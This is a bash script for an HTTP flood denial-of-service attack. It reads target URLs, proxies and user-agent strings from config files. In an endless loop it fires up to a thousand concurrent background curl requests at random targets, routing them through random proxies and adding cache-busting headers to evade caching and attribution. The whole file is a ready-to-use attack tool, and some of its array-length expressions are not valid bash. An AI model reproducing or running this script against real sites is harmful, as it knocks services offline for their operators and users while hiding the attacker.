#!/bin/bash

#cURL location
CURL=`which curl`
if [[ -z $CURL ]]
then
    echo "Can not found curl path."
    read -p "Please input curl path: " CURL
fi

#ps location
PS=`which ps`
if [[ -z $PS ]]
then
    echo "Can not found ps path."
    read -p "Please input ps path: " PS
fi


#Input max connections
read -p "Please input max connections. (Default: 1000): " MC

if [[ -z "$MC" ]]
then
    MC=1000
else
    NUM_REGEX='^[0-9]+$'
    if ! [[ $MC =~ $NUM_REGEX ]]
    then
        echo "Max connections must be integer"
        exit 1
    fi

    if [ $MC -le 0 ]
    then
        echo "Max connections must greater 0"
        exit 1
    fi
fi

#cURL parameters
CURL="$CURL -s -o /dev/null --retry 0 -w %{http_code} -m 1 --keepalive-time 1 --connect-timeout 1"

#Proxy list file
PROXY_FILE="proxy.cfg"

#Headers list file
HEADERS_FILE="headers.cfg"

#Target list file
TARGET_FILE="target.cfg"

#Read proxy list from proxy file
while read P_LINE
do
    P+=("$P_LINE")
done < $PROXY_FILE

#Read proxy list from proxy file
while read H_LINE
do
    H+=("$H_LINE")
done < $HEADERS_FILE

#Read proxy list from proxy file
while read T_LINE
do
    T+=("$T_LINE")
done < $TARGET_FILE

#Total proxy, headers, target(index)
TP=${#P[@] - 1}
TH=${#H[@] - 1}
TT=${#T[@] - 1}

if [ $TP -eq 0 ]
then
    TP=
    echo "You have no any proxies!"
    sleep 3
fi

if [ $TH -eq 0 ]
then
    echo "Header can not be empty!"
    exit 1
fi

if [ $TT -eq 0 ]
then
    echo "Target url can not be empty!"
    exit 1
fi

#Main attack function
function attack()
{
    local URL=$1
    local P=$2
    local H=$3
    local THREADS=$4
    RESULT=`$CURL -H "User-Agent: $H" -H "Cache-Control: no-cache" -H "Pragma: no-cache" -x $P $URL &`

    #Print result
    echo -e "$URL"
    echo -e "HTTP Status : $RESULT\tProxy : $P"
    echo -e "Current threads : $THREADS"
}

#Attack without proxy
function attackWithoutProxy()
{
    local URL=$1
    local H=$2
    local THREADS=$3
    RESULT=`$CURL -H "user-agent: $H" -H "Cache-Control: no-cache" -H "Pragma: no-cache" $URL &`

    echo -e "$URL"
    echo -e "HTTP Status : $RESULT\tProxy : \033[0;31mNo Proxy\033[0m"
    echo -e "Current threads : $THREADS"
}

while [ 1 ]
do

    #Get current curl connections
    THREAD=`$PS aux|grep curl|grep -v grep|wc -l`

    #Max curl connections
    if [ "$THREAD" -lt $MC ]
    then
        #Random headers
        H_R=${H[$RANDOM%TH]}

	#Random target url
	T_R=${T[$RANDOM%TT]}

        if ! [[ -z $H_R ]]
        then
            if ! [[ -z $T_R ]]
            then

                if ! [[ -z $TP ]]
                then
                    #Random proxy server
                    P_R=${P[$RANDOM%TP]}
                    if [ -z $P_R ]
                    then
                        attackWithoutProxy $T_R "$H_R" $THREAD &
                    else
                        attack $T_R $P_R "$H_R" $THREAD &
                    fi
                else
                    attackWithoutProxy $T_R "$H_R" $THREAD &
                fi
            else
                echo "Target url is empty, bypass this one test."
            fi
        else
            echo "Header is empty, bypass this one test."
        fi
    fi
done